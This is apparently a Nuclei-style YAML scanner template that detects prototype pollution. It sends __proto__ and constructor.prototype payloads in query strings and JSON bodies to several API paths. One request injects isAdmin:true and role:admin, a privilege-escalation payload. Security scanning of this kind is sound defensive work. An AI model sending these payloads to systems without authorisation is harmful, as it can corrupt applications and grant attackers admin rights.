id: whai-prototype-pollution

info:
  name: Prototype Pollution Detection
  author: whitehat-ai
  severity: high
  description: Detects client-side and server-side prototype pollution vulnerabilities
  tags: prototype-pollution,javascript,xss
  reference:
    - https://portswigger.net/web-security/prototype-pollution

http:
  - method: GET
    path:
      - "{{BaseURL}}/?__proto__[whaitest]=polluted"
      - "{{BaseURL}}/?__proto__.whaitest=polluted"
      - "{{BaseURL}}/?constructor[prototype][whaitest]=polluted"
      - "{{BaseURL}}/?constructor.prototype.whaitest=polluted"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "polluted"

  - method: POST
    path:
      - "{{BaseURL}}/api/user"
      - "{{BaseURL}}/api/settings"
      - "{{BaseURL}}/api/data"
    headers:
      Content-Type: "application/json"
    body: '{"__proto__":{"whaitest":"polluted"},"constructor":{"prototype":{"whaitest":"polluted"}}}'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "polluted"

  - method: POST
    path:
      - "{{BaseURL}}/api/merge"
      - "{{BaseURL}}/api/update"
      - "{{BaseURL}}/api/config"
    headers:
      Content-Type: "application/json"
    body: '{"__proto__":{"isAdmin":true,"role":"admin","status":1}}'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - "(?i)(\"isAdmin\":\\s*true|\"role\":\\s*\"admin\")"
